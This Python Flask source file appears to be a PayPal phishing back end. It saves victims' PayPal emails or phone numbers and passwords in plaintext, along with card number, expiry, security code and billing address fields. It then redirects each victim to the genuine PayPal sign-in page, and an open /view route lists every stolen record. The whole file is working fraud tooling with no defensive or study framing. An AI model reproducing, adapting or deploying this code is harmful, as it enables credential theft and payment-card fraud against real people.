from flask import Flask, request, render_template, url_for, redirect, g
import sqlite3
import os

app = Flask(__name__)

# SQLite configuration
DATABASE = 'paypal.db'

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_connection(exception):
    db = g.pop('db', None)
    if db is not None:
        db.close()

# Create tables if they don’t exist
with app.app_context():
    db = get_db()
    cursor = db.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            reason TEXT,
            amount REAL
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email_phone TEXT,
            password TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS payment_details (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            house_number TEXT,
            mm_yy TEXT,
            code TEXT,
            first_name TEXT,
            last_name TEXT,
            street_address TEXT,
            apt_ste TEXT,
            state TEXT,
            zip_code TEXT,
            phone_number TEXT,
            email TEXT
        )
    """)
    db.commit()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/payment')
def payment_page():
    reason = request.args.get('reason', 'No reason provided')
    amount = request.args.get('amount', '0.00')
    return render_template('payment.html', reason=reason, amount=amount)
  
@app.route('/store_payment', methods=['POST'])
def store_payment():
    reason = request.form.get('reason')
    amount = request.form.get('amount')
    db = get_db()
    db.execute("INSERT INTO payments (reason, amount) VALUES (?, ?)", (reason, amount))
    db.commit()
    return redirect("https://www.paypal.com/signin?country.x=KE&locale.x=en_US&langTgl=en")

@app.route('/login')
def login_page():
    return render_template('login.html')

@app.route('/store_user', methods=['POST'])
def store_user():
    email_phone = request.form.get('email_phone')
    password = request.form.get('password')
    db = get_db()
    db.execute("INSERT INTO users (email_phone, password) VALUES (?, ?)", (email_phone, password))
    db.commit()
    return redirect("https://www.paypal.com/us/signin?Z3JncnB0=")

@app.route('/store_payment_details', methods=['POST'])
def store_payment_details():
    data = (
        request.form.get('house_number'),
        request.form.get('mm_yy'),
        request.form.get('code'),
        request.form.get('first_name'),
        request.form.get('last_name'),
        request.form.get('street_address'),
        request.form.get('apt_ste'),
        request.form.get('state'),
        request.form.get('zip_code'),
        request.form.get('phone_number'),
        request.form.get('email')
    )
    db = get_db()
    db.execute("""
        INSERT INTO payment_details (house_number, mm_yy, code, first_name, last_name, street_address, apt_ste, state, zip_code, phone_number, email) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, data)
    db.commit()
    return redirect("https://www.paypal.com/us/signin?Z3JncnB0=")

@app.route('/view')
def view_data():
    db = get_db()
    payments = db.execute("SELECT * FROM payments").fetchall()
    users = db.execute("SELECT * FROM users").fetchall()
    payment_details = db.execute("SELECT * FROM payment_details").fetchall()
    return render_template('view.html', payments=payments, users=users, payment_details=payment_details)

if __name__ == '__main__': 
    app.run(debug=True)
